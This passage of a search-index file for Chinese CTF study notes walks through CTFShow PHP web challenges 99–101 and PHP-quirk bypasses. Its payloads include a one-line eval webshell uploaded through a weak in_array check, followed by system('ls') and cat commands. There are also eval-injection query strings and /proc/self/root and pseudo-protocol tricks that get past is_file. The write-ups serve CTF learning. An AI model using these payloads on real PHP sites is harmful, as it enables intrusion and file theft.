\u53c2\u6570</p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u4efb\u610f\u7684 GET \u4fdd\u8bc1<code>$_GET</code>\u662f\u88ab\u8bbe\u7f6e\u7684\u3002\u7136\u540e POST \u4e00\u4e2a\u8986\u76d6\u5b83 \u3002</p> <p>\u65e2\u7136get\u4f20\u5165\u7684\u503c\u4f1a\u88ab\u5b9a\u4f4d\u6307\u5411\u5230post\u6240\u5bf9\u5e94\u7684\u503c\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u6709get\u5b58\u5728\u5373\u53ef\uff0c\u540c\u65f6post\u4f20\u5165HTTP_FLAG=flag\u5c31\u53ef\u4ee5\u4e86</p> <p>payload:<code>get\uff1a1=1 post\uff1aHTTP_FLAG=flag</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#7php-in_array","title":"7\u3001php \u5f31\u7c7b\u578b\u6bd4\u8f83 in_array()","text":"<p>\uff08Web 99\uff09</p> PHP<pre><code>&lt;?php\n$allow = array();\nfor ($i = 36; $i &lt; 0x36d; $i++) {\n    array_push($allow, rand(1, $i));\n}\nif (isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)) {\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n?&gt;\n\n\u8be5\u51fd\u6570\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u7a7a\u6570\u7ec4$allow\uff0c\u7136\u540e\u4f7f\u7528for\u5faa\u73af\u751f\u62101\u5230(36-0x36d)\u4e4b\u95f4\u7684\u968f\u673a\u6570\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230$allow\u6570\u7ec4\u4e2d\u3002\u63a5\u4e0b\u6765\uff0c\u5982\u679c$_GET['n']\u5b58\u5728\u4e14\u5728$allow\u6570\u7ec4\u4e2d\uff0c\u5219\u5c06$_POST['content']\u5199\u5165\u5230$_GET['n']\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\u3002\n</code></pre> <p>array_push() \u51fd\u6570\uff1a\u5411\u6570\u7ec4\u5c3e\u90e8\u63d2\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20</p> <p>rand() \u51fd\u6570\u968f\u673a\u751f\u6210\u6570\u7ec4rand(min,max)</p> <p>file_put_contents() \u51fd\u6570\uff1a\u628a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\u4e2d</p> <p>\u8fd9\u9898\u7a81\u7834\u70b9\u5728<code>in_array()</code>\u51fd\u6570</p> <p>in_array\uff1a(PHP 4, PHP 5, PHP 7)</p> <p>\u529f\u80fd\uff1a\u68c0\u67e5\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u67d0\u4e2a\u503c</p> PHP<pre><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )\n</code></pre> <p>\u5728 <code>$haystack</code>\u4e2d\u641c\u7d22<code>$needle</code>\uff0c\u5982\u679c\u7b2c\u4e09\u4e2a\u53c2\u6570<code>$strict</code>\u7684\u503c\u4e3a TRUE\uff0c\u5219 in_array()\u51fd\u6570\u4f1a\u8fdb\u884c\u5f3a\u68c0\u67e5\uff0c\u68c0\u67e5 <code>$needle</code>\u7684\u7c7b\u578b\u662f\u5426\u548c <code>$haystack</code>\u4e2d\u7684\u76f8\u540c\u3002\u5982\u679c\u627e\u5230 <code>$haystack</code>\uff0c\u5219\u8fd4\u56de TRUE\uff0c\u5426\u5219\u8fd4\u56de FALSE\u3002</p> <p>\u5f88\u660e\u663e\uff0c\u8fd9\u9898\u4f7f\u7528in_array()\u51fd\u6570\u65f6\u5e76\u6ca1\u6709\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3aTRUE\uff0c\u6240\u4ee5\u6b64\u65f6\u662f==\u7684\u5f31\u7c7b\u578b\u6bd4\u8f83\u3002\uff08\u5f31\u6bd4\u8f83\u5b57\u7b26\u4e32 1.php \u4e0e 1 \u8fd4\u56de true\uff09</p> <p>\u7ed5\u8fc7\u65b9\u6cd5: \u4f20\u5165n=1.php\u3002\uff08\u8fd9\u9053\u9898\uff0c\u6bcf\u6b21\u751f\u6210\u968f\u673a\u6570\u90fd\u5305\u542b 1\uff0c\u6240\u4ee5 1 \u5728\u6570\u7ec4\u4e2d\u7684\u53ef\u80fd\u6700\u5927\uff09\u56e0\u4e3aPHP\u5728\u4f7f\u7528 in_array()\u51fd\u6570\u5224\u65ad\u65f6\uff0c\u4f1a\u5c06 1.php\u5f3a\u5236\u8f6c\u6362\u6210\u6570\u5b571\uff0c\u800c\u6570\u5b571\u5728 range(1,24)\u6570\u7ec4\u4e2d\uff0c\u5f53\u968f\u673a\u751f\u6210\u7684\u6570\u5b57\u6b63\u597d\u662f1\u65f6\u7ed5\u8fc7 in_array()\u51fd\u6570\u5224\u65ad\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002</p> <p>payload:</p> Text Only<pre><code>n=1.php\npost:content=&lt;?php eval($_POST[1]);?&gt;\n</code></pre> <p>\u591a\u8bd5\u51e0\u6b21\uff0c\u76f4\u5230\u4e0d\u62a5\u9519\u7684\u90a3\u4e00\u6b21\uff0c\u8bf4\u660e\u6210\u529f\u4f20\u5165\u4e00\u53e5\u8bdd\u3002</p> <p>\u7136\u540e\u8bbf\u95eehttps://url/1.php\uff0c\u518dpost\u4f20\u51651=system('ls');</p> <p>\u518dpost: 1=system('cat flag***.php')\uff1b</p> <p>\u7136\u540e\u5728\u7f51\u9875\u6e90\u7801\u4e2d\u770b\u5230flag</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#8and-or","title":"8\u3001and\u4e0e&amp;&amp; \u3001or\u4e0e||\u7684\u533a\u522b","text":"<p>\uff08Web 100\uff09</p> <p>\u4ee5\u4e0b\u662f\u5bf9php\u4e2dOR\u4e0e||\u3001AND\u4e0e&amp;&amp;\u7684\u533a\u522b\u8fdb\u884c\u4e86\u8be6\u7ec6\u7684\u603b\u7ed3\u4ecb\u7ecd</p> <p>\u672c\u8eab\u6ca1\u6709\u533a\u522b\uff0c\u4e60\u60ef\u95ee\u9898 \uff0c\u4f46\u662f\u6709\u65f6\u5019\u7275\u6d89\u5230\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\u7684\u95ee\u9898\uff0c\u7ed3\u679c\u4f1a\u4e0d\u540c\u3002</p> <p>\u8d4b\u503c\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u6bd4AND\u548cOR\u7684\u9ad8\uff0c\u6240\u4ee5\u5148\u8d4b\u503c\uff1b\u6bd4&amp;&amp;\u548c||\u7684\u4f4e\uff0c\u6240\u4ee5\u903b\u8f91\u8fd0\u7b97\u7b26\u5148\u6267\u884c\uff0c\u5148\u903b\u8f91\u8fd0\u7b97\uff0c\u518d\u8d4b\u503c</p> <p>\u4f8b\u5982\uff1a</p> PHP<pre><code>&lt;?php\n$p = 6 or 0;\nvar_dump($p);//int(6)\n\n$p = 6 || 0;\nvar_dump($p);//bool(true)\n\n$p = 6 and 0;\nvar_dump($p); //int(6) \n\n$p = 6 &amp;&amp; 0;\nvar_dump($p); //bool(false) \n?&gt;\n</code></pre> PHP<pre><code>&lt;?php\n$bA = true;\n$bB = false;\n$b1 = $bA and $bB;\n$b2 = $bA &amp;&amp; $bB;\nvar_dump($b1); // $b1 = true\nvar_dump($b2); // $b2 = false\n$bA = false;\n$bB = true;\n$b3 = $bA or $bB;\n$b4 = $bA || $bB;\nvar_dump($b3); // $b3 = false\nvar_dump($b4); // $b4 = true\n\n\n$bA = true;\n$bB = false;\nvar_dump($bA and $bB); // false\nvar_dump($bA &amp;&amp; $bB); // false\n$bA = false;\n$bB = true;\nvar_dump($bA or $bB); // true\nvar_dump($bA || $bB); // true\n?&gt;\n</code></pre> <p>\u901a\u8fc7\u8fd9\u4e2a\u8868\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 and/&amp;&amp; \u548c or/|| \u8fd9\u4e24\u7ec4\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u7adf\u7136\u662f\u4e0d\u4e00\u6837\u7684\u3002and\u548cor\u7684\u4f18\u5148\u7ea7\u662f\u4f4e\u4e8e=\u7684\uff0c\u6240\u4ee5\u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u597d\u7406\u89e3\u4e86\uff0c\u5c31\u662f\u5148\u505a\u8d4b\u503c\u7136\u540e\u518d\u505a\u4e86\u4e00\u4e2aand\u6216or\u7684\u903b\u8f91\u8fd0\u7b97\uff0c\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u5e76\u6ca1\u6709\u5b58\u4e0b\u6765\uff0c \u6240\u4ee5\u6700\u540e\u51fa\u6765\u8ba9\u6211\u4eec\u532a\u5937\u6240\u601d\u7684\u7ed3\u679c\u3002</p> \u7ed3\u5408\u6027 \u8fd0\u7b97\u7b26 \u989d\u5916\u4fe1\u606f \u65e0\u7ed3\u5408\u6027 clone new \u514b\u9686\u548cnew \u5de6 [ \u6570\u7ec4 \u5de6 ** \u7b97\u672f \u53f3 ++ \u2014 ~ (int) (float) (string) (array) (object) (bool) @ \u7c7b\u578b\u548c\u81ea\u589e/\u81ea\u51cf \u65e0\u7ed3\u5408\u6027 instanceof \u7c7b\u578b \u53f3 ! \u903b\u8f91\u8fd0\u7b97 \u5de6 * / % \u7b97\u672f \u5de6 + \u2013 . \u7b97\u672f\u548c\u5b57\u7b26\u4e32 \u5de6 &lt;&lt; &gt;&gt; \u6309\u4f4d\u8fd0\u7b97 \u65e0\u7ed3\u5408\u6027 &lt; &lt;= &gt; &gt;= \u6bd4\u8f83\u8fd0\u7b97 \u65e0\u7ed3\u5408\u6027 <code>== != === !== &lt;&gt;</code> \u6bd4\u8f83\u8fd0\u7b97 \u5de6 &amp; \u6309\u4f4d\u8fd0\u7b97\u548c\u5f15\u7528 \u5de6 ^ \u6309\u4f4d\u8fd0\u7b97 \u5de6 | \u6309\u4f4d\u8fd0\u7b97 \u5de6 &amp;&amp; \u903b\u8f91\u8fd0\u7b97 \u5de6 | | \u903b\u8f91\u8fd0\u7b97 \u5de6 ?: \u4e09\u5143\u6761\u4ef6\u9009\u62e9 \u53f3 = += -= *= /= .= %= &amp;= = ^= &lt;&lt;= &gt;&gt;= =&gt; | \u8d4b\u503c \u5de6 and \u903b\u8f91\u8fd0\u7b97 \u5de6 xor \u903b\u8f91\u8fd0\u7b97 \u5de6 or \u903b\u8f91\u8fd0\u7b97 \u5de6 , \u5f88\u591a\u4f7f\u7528 <p>\u9898\u76ee\uff1a\uff08Web 100\uff09</p> PHP<pre><code>// Web 100\n\n&lt;?php\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1 = $_GET['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif ($v0) {\n    if (!preg_match(\"/\\;/\", $v2)) {\n        if (preg_match(\"/\\;/\", $v3)) {\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n</code></pre> <p>\u56e0\u4e3a\u8d4b\u503c\u7684\u4f18\u5148\u7ea7(=)\u9ad8\u4e8eand\u6240\u4ee5v 0 \u7684 \u503c \u53ef \u4ee5 \u7531 v0\u7684\u503c\u53ef\u4ee5\u7531v0\u7684\u503c\u53ef\u4ee5\u7531v1\u6765\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7ed9\u5176\u8d4b\u503c\u4e3a1\u4e5f\u5c31\u662ftrue</p> <p>Payload\uff1a</p> PHP<pre><code>?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;\nv1=1&amp;v2=system(\"cat ctfshow.php\")/*&amp;v3=*/;\n</code></pre> <p>\u56e0\u4e3a\u6e90\u7801\u4e2d\u7ed9\u4e86\u63d0\u793a \uff1a<code>flag in class ctfshow;</code>\uff0c\u6240\u4ee5\u8f93\u51fa\u4e00\u4e2a\u65b0\u7684\"ctfshow\"\u7c7b\u3002</p> <p>\u5f97\u5230 flag_is_bde4fb430x2d62590x2d404f0x2dbaa30x2da2d6bd94ed98 \u628aox2d\u6362\u6210-\uff0c\u518d\u5957\u4e0a{}\u5373\u53ef</p> <p>\u6ce8\u610f\u8fd9\u91ccv3\u53ea\u80fd\u5305\u542b<code>;</code>\uff0c\u53ef\u4ee5\u662f\u591a\u4e2a\u53e0\u52a0\uff0c\u4f46\u4e0d\u80fd\u6709\u5176\u4ed6\u5b57\u7b26\u3002</p> <p>var_dump() \u51fd\u6570\u7528\u4e8e\u8f93\u51fa\u53d8\u91cf\u7684\u76f8\u5173\u4fe1\u606f\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#9-reflectionclass","title":"9\u3001\u53cd\u5c04\u7c7b ReflectionClass","text":"<p>\uff08Web 101\uff09</p> <p>\u53cd\u5c04\u7c7b\uff0c\u505a\u8fc7\u9898\u90fd\u662f\u76f4\u63a5\u8f93\u51fa\u8fd9\u4e2a\u7c7b<code>echo new ReflectionClass('\u7c7b\u540d');</code></p> <p>\u5229\u7528\u53cd\u5c04\u7c7b\uff0c<code>Relectionclass()</code>\u51fd\u6570\uff0c\u4f5c\u7528\uff1a\u6839\u636e\u7c7b\u540d\u53cd\u5c04\u4e00\u4e2a\u7c7b\u3002\u5728\u4ee3\u7801\u6267\u884c\u65f6\uff0c\u52a0\u5165\u8f93\u5165\u4e00\u4e2aA\uff0c\u4f46\u662f\u5728\u903b\u8f91\u5224\u65ad\u4e4b\u540e\uff0c\u751f\u6210\u4e86\u4e00\u4e2aB\u7c7b\uff0c\u6240\u4ee5\u8fd9\u65f6\uff0c\u7528Relectionclass(\"A\")\u6765\u9650\u5b9a\u751f\u6210A\u7c7b\u3002</p> PHP<pre><code>// \uff08Web 101\uff09\n\n&lt;?php\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1 = $_GET['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif ($v0) {\n    if (!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)) {\n        if (!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)) {\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n</code></pre> <p>payload\uff1a<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p> <p>\u53cd\u5c04\u7c7b\u53ef\u4ee5\u8bf4\u6210\u662f\u7c7b\u7684\u4e00\u4e2a\u6620\u5c04\uff0c\u53ef\u4ee5\u5229\u7528\u53cd\u5c04\u7c7b\u6765\u4ee3\u66ff\u6709\u5173\u7c7b\u7684\u5e94\u7528\u7684\u4efb\u4f55\u8bed\u53e5</p> <p>\u5176\u5c5e\u6027\u4e3a\u7c7b\u7684\u4e00\u4e2a\u540d\u79f0\uff0c\u8fd9\u9053\u9898\u76ee\u91cc\u9762\u7c7b\u7684\u540d\u79f0\u4e3actfshow</p> <p>\u4e3e\u4f8b\uff1a</p> PHP<pre><code>&lt;?php\nclass hacker\n{\n    public $hackername = \"yn8rt\";\n    const  yn8rt = 'nb666';\n    public  function show()\n    {\n        echo $this-&gt;name, '&lt;br&gt;';\n    }\n}\n//\u6709\u8fd9\u4e48\u4e00\u4e2ahacker\u7c7b\uff0c\u5047\u8bbe\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u4e2a\u7c7b\u662f\u5e72\u4ec0\u4e48\u7528\u7684\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u7c7b\u91cc\u9762\u7684\u4fe1\u606f\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u7528\u5230ReflectionClass\u6765\u5bf9\u7c7b\u8fdb\u884c\u53cd\u5c04\n//\u73b0\u5728\u6211\u53ef\u4ee5\u901a\u8fc7\u53cd\u5c04\u6765\u83b7\u53d6\u8fd9\u4e2a\u7c7b\u4e2d\u7684\u65b9\u6cd5\uff0c\u5c5e\u6027\uff0c\u5e38\u91cf\n\n//\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u4fe1\u606f\n\n$reflection = new ReflectionClass('hacker'); //\u5b9e\u4f8b\u5316\u53cd\u5c04\u5bf9\u8c61,\u6620\u5c04hacker\u7c7b\u7684\u4fe1\u606f\n$consts = $reflection-&gt;getConstants(); //\u83b7\u53d6\u6240\u6709\u5e38\u91cf\n$props = $reflection-&gt;getProperties(); //\u83b7\u53d6\u6240\u6709\u5c5e\u6027\n$methods = $reflection-&gt;getMethods(); //\u83b7\u53d6\u6240\u6709\u65b9\u6cd5\nvar_dump($consts);\nvar_dump($props);\nvar_dump($methods);\n\n?&gt;\n</code></pre> <p>\u8fd4\u56de\u503c\uff1a</p> PHP<pre><code>&lt;?php\narray(1) {\n  [\"yn8rt\"]=&gt;\n  string(5) \"nb666\"\n}\narray(1) {\n  [0]=&gt;\n  &amp;object(ReflectionProperty)#2 (2) {\n    [\"name\"]=&gt;\n    string(10) \"hackername\"\n    [\"class\"]=&gt;\n    string(6) \"hacker\"\n  }\n}\narray(1) {\n  [0]=&gt;\n  &amp;object(ReflectionMethod)#3 (2) {\n    [\"name\"]=&gt;\n    string(4) \"show\"\n    [\"class\"]=&gt;\n    string(6) \"hacker\"\n  }\n}\n?&gt;\n</code></pre> <p>\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u65b9\u6cd5\u7684\u8bdd\uff0c\u5c31\u4f1a\u50cf\u9898\u76ee\u4e2d\u9ed8\u8ba4\u8f93\u51fa\u5f88\u591a\u4e1c\u897f\uff1a</p> <ol> <li>\u5e38\u91cf Contants</li> <li>\u5c5e\u6027 Property Names</li> <li>\u65b9\u6cd5 Method Names\u9759\u6001</li> <li>\u5c5e\u6027 Static Properties</li> <li>\u547d\u540d\u7a7a\u95f4 Namespace</li> <li>Person\u7c7b\u662f\u5426\u4e3afinal\u6216\u8005abstract</li> <li>Person\u7c7b\u662f\u5426\u6709\u67d0\u4e2a\u65b9\u6cd5</li> </ol>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#_4","title":"\u8fdb\u5ea6 \u5206\u5272\u7ebf","text":"<p>\u5355\u5f15\u53f7\u5305\u88f9\u7684\u5185\u5bb9\u53ea\u80fd\u5f53\u505a\u7eaf\u5b57\u7b26\u4e32, \u800c\u53cc\u5f15\u53f7\u5305\u88f9\u7684\u5185\u5bb9, \u53ef\u4ee5\u8bc6\u522b\u53d8\u91cf, \u6240\u4ee5 <code>\"$url\"</code> \u53ef\u4ee5\u5f53\u505a<code>$url</code> \u53d8\u91cf\u88ab\u6b63\u5e38\u6267\u884c</p> <p>PHP\u5f00\u59cb\u7ed3\u675f\u6807\u7b7e</p> <p><code>&lt;?php ?&gt;</code>\uff1aphp\u9ed8\u8ba4\u7684\u5f00\u59cb\u3001\u7ed3\u675f\u6807\u7b7e </p> <p><code>&lt;? ?&gt;</code>\uff1a\u9700\u8981\u5f00\u542fshort_open_tag \uff0c\u5373short_open_tag = On\u3002</p> <p><code>&lt;% %&gt;</code>\uff1a\u9700\u8981\u5f00\u542fasp_tags \uff0c\u5373asp_tags = On\u3002</p> <p><code>&lt;?= ?&gt;</code>\uff1a\u7528\u4e8e\u8f93\u51fa\uff0c\u7b49\u540c\u4e8e- \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528</p> <p><code>&lt;%= %&gt;</code>\uff1a\u7528\u4e8e\u8f93\u51fa\uff0c\u7b49\u540c\u4e8e- \uff0c\u9700\u8981\u5f00\u542fasp_tags \uff0c\u624d\u53ef\u4ee5\u4f7f\u7528</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#10is_numeric-hex2bin","title":"10\u3001is_numeric \u4e0e hex2bin","text":"<p>is_numeric \u5728 PHP5 \u4e2d\u662f\u53ef\u4ee5\u8bc6\u522b\u5341\u516d\u8fdb\u5236\u7684\uff0chex2bin \u53c2\u6570\u4e0d\u80fd\u5e26 0x</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#11sha1","title":"11\u3001sha1 \u6bd4\u8f83\u7f3a\u9677","text":"<p>sha1 \u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u4e0b\u53ef\u4f7f\u7528 a[]=1&amp;b[]=1 \u6570\u7ec4\u7ed5\u8fc7</p> PHP<pre><code>&lt;?php\nif ($a == $b) {\n    if (sha1($a) == sha1($b)) {\n        echo $flag;\n    }\n}\n?&gt;\n</code></pre> <p>\u4f46 MD5 \u6216\u8005 sha1 \u8fd9\u79cd\u5982\u679c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u540e\uff0c\u5c31\u4e0d\u63a5\u53d7\u6570\u7ec4\u4e86\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u627e\u771f\u6b63\u7684\u7f16\u7801\u540e\u76f8\u540c\u7684\u4e86\uff0c\u5982</p> <p><code>aaroZmOk</code> <code>aaK1STfY</code> <code>aaO8zKZF</code> <code>aa3OFF9m</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#12php","title":"12\u3001PHP \u53cc \\(\uff08\\)$\uff09\u7684\u53d8\u91cf\u8986\u76d6","text":"<p>\u5728\u53cc\u5199 $ \u7684\u65f6\u5019\uff0c\u5c5e\u4e8e\u52a8\u6001\u53d8\u91cf\uff0c\u5c31\u662f\u540e\u9762\u7684\u53d8\u91cf\u503c\u4f5c\u4e3a\u65b0\u7684\u53d8\u91cf\u540d</p> PHP<pre><code>$test=\"a23\";    $test\u7b49\u4e8ea23\n$$test=456;     $$test\u4e5f\u5c31\u7b49\u4e8e$23,\u8fd9\u91cc\u76f8\u5f53\u4e8e\u7ed9$a23\u8d4b\u503c\u4e86\necho $test;     \u6b63\u5e38\u8f93\u51fa$test\u4e3aa23\necho $$test;    \u8fd9\u91cc\u8f93\u51fa$$test\uff0c\u5c31\u662f$a23\uff0c\u4e3a456\necho $a23;      \u7b2c\u4e8c\u884c\u7ed9$a23\u8d4b\u503c\u4e86\uff0c\u8fd9\u91cc\u6b63\u5e38\u8f93\u51fa\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#13parse_str","title":"13\u3001parse_str \u51fd\u6570\u7684\u4f7f\u7528","text":"<p>parse_str \u4f1a\u628a\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u53d8\u91cf\uff0c\u5927\u90e8\u5206\u662f\u4f20\u5165\u7684\u591a\u4e2a\u503c</p> PHP<pre><code>$a=\"q=123&amp;p=456\";\nparse_str($a);\necho $q;                \u8f93\u51fa123\necho $p;                \u8f93\u51fa456\nparse_str($a,$b);       \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f5c\u4e3a\u6570\u7ec4\uff0c\u89e3\u6790\u7684\u53d8\u91cf\u90fd\u5b58\u5165\u8fd9\u4e2a\u6570\u7ec4\u4e2d\necho $b['q'];           \u8f93\u51fa123\necho $b['p'];           \u8f93\u51fa456\n</code></pre> <p>php8 \u7248\u672c\u5fc5\u987b\u8981\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0cphp7 \u4e0d\u5f71\u54cd\u4f7f\u7528\u4f46\u4f1a\u8b66\u544a\u4e00\u4e0b</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#14ereg-00","title":"14\u3001ereg %00 \u6b63\u5219\u622a\u65ad","text":"<p>ereg PHP5.3 \u5e9f\u5f03\u4e86\uff0c\u529f\u80fd\u53ef\u4ee5\u7531 preg_match \u4ee3\u66ff\uff0cereg \u6709\u4e2a\u622a\u65ad\u6f0f\u6d1e\uff0c\u5b57\u7b26\u4e32\u91cc\u5305\u62ec %00 \u5c31\u53ea\u5339\u914d %00 \u4e4b\u524d\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u53ef\u4ee5\u524d\u9762\u6839\u636e\u6b63\u5219\u6539\uff0c\u540e\u9762\u662f\u6267\u884c\u8bed\u53e5\uff0c\u5982\u679c\u6709 strrev() \u8fd9\u79cd\u5b57\u7b26\u4e32\u53cd\u8f6c\u51fd\u6570\u914d\u5408\u7528\u66f4\u597d\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#15","title":"15\u3001\u8fed\u4ee3\u5668\u83b7\u53d6\u5f53\u524d\u76ee\u5f55","text":"<p>FilesystemIterator \u53ef\u4ee5\u83b7\u5f97\u6587\u4ef6\u76ee\u5f55\uff0c\u53c2\u6570\u9700\u8981 <code>.</code> \u6216\u8005\u5177\u4f53\u8def\u5f84\uff0cgetcwd() \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u8def\u5f84\uff0c\u4e8c\u8005\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\u914d\u5408\u4f7f\u7528\u8f83\u597d</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#16globals","title":"16\u3001$GLOBALS \u5168\u5c40\u53d8\u91cf\u7684\u4f7f\u7528","text":"<p>$GLOBALS \u2014 \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf \u4e00\u4e2a\u5305\u542b\u4e86\u5168\u90e8\u53d8\u91cf\u7684\u5168\u5c40\u7ec4\u5408\u6570\u7ec4\u3002\u53d8\u91cf\u7684\u540d\u5b57\u5c31\u662f\u6570\u7ec4\u7684\u952e\u3002</p> <p>\u6784\u9020\u51fa var_dump($GLOBALS); \u53ef\u4ee5\u8f93\u51fa\u5168\u90e8\u53d8\u91cf\u503c\uff0c\u5305\u62ec\u81ea\u5b9a\u4e49</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#17php-is_file-highlight_file-php","title":"17\u3001php \u4f2a\u534f\u8bae\u7ed5\u8fc7 is_file highlight_file \u5bf9\u4e8e php \u4f2a\u534f\u8bae\u7684\u4f7f\u7528","text":"<p>is_file \u5224\u65ad\u7ed9\u5b9a\u6587\u4ef6\u540d\u662f\u5426\u4e3a\u4e00\u4e2a\u6b63\u5e38\u7684\u6587\u4ef6\uff0c\u8fd4\u56de\u503c\u4e3a\u5e03\u5c14\u7c7b\u578b\u3002is_file \u4f1a\u8ba4\u4e3a php \u4f2a\u534f\u8bae\u4e0d\u662f\u6587\u4ef6\u3002\u4f46 highlight_file \u8ba4\u4e3a\u4f2a\u534f\u8bae\u53ef\u4ee5\u662f\u6587\u4ef6\u3002</p> PHP<pre><code>&lt;?php\nif (!is_file($file)) {\n    highlight_file($file);\n} else {\n    echo \"hacker!\";\n}\n?&gt;\n</code></pre> <p>\u5982\u4e0a\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u4f20\u5165 php \u4f2a\u534f\u8bae\u8fdb\u884c\u7ed5\u8fc7\u5e76\u4e14\u663e\u793a\u542b\u6709 flag \u7684\u6587\u4ef6\u3002\u82e5\u6709\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u6362\u5176\u4ed6\u4f2a\u534f\u8bae\u6216\u6539\u7f16\u7801\u65b9\u5f0f</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#18-is_file","title":"18\u3001\u591a\u5199\u6839\u76ee\u5f55\u7ed5\u8fc7 is_file","text":"<p>\u5728 linux \u4e2d / proc/self/root \u662f\u6307\u5411\u6839\u76ee\u5f55\u7684\uff0c\u4e5f\u5c31\u662f\u5982\u679c\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165 ls /proc/self/root\uff0c\u5176\u5b9e\u663e\u793a\u7684\u5185\u5bb9\u662f\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9 \u591a\u6b21\u91cd\u590d\u540e\u7ed5\u8fc7 is_file \u7684\u5177\u4f53\u539f\u7406\u5c1a\u4e0d\u6e05\u695a\u3002\u5982\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e0b\u9762 payload \u4ee3\u66ff</p> PHP<pre><code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n</code></pre> <p>\u8fd9\u4e2a\u6309\u7406\u8bf4\u4e5f\u662f\u6587\u4ef6\u7684\uff0c\u4f46 is_file \u8ba4\u4e3a\u4e0d\u662f</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#19trim-is_numeric","title":"19\u3001trim \u51fd\u6570\u7684\u7ed5\u8fc7 + is_numeric 